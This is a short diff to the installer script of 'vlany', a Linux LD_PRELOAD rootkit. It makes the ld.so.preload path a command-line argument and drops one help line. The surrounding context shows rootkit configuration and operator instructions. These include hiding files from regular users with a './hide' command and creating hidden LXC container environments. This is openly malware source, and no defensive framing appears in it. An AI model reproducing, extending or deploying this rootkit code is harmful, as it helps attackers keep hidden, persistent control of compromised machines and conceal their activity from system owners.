@@ -50,7 +50,7 @@ else:
 
 PTRACE_BUG_MSG = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(50))
 ACTIVATE_SWITCH = False
-LD_PRELOAD = "/etc/ld.so.preload"
+LD_PRELOAD = sys.argv[15]
 PROC_NET_TCP = "/proc/net/tcp"
 PROC_NET_TCP6 = "/proc/net/tcp6"
 SSL_CIPHER_LIST = "ALL:!ADH:!LOW:!EXP:!MD5:@STRENGTH"
@@ -429,7 +429,6 @@ File hiding/protection:
     FILES OR DIRECTORIES CREATED IN THIS SHELL AREN'T HIDDEN DYNAMICALLY DUE TO THE NEW FILE HIDING BY EXTENDED ATTRIBUTES.
     ONCE YOU CREATE NEW FILES OR DIRECTORIES, YOU MUST ISSUE THE ./hide COMMAND ON THE NEWLY CREATED FILES/DIRECTORIES TO
     PROTECT THEM FROM REGULAR USERS. THIS IS VERY IMPORTANT. DO NOT FORGET THIS.
-    ld.so.preload and your hidden directory are by default, already fully protected.
 
 vlany LXC container:
   There's a file called enter_lxc.c in your home directory. It allows for on-the-fly creation and destruction of hidden container environments.
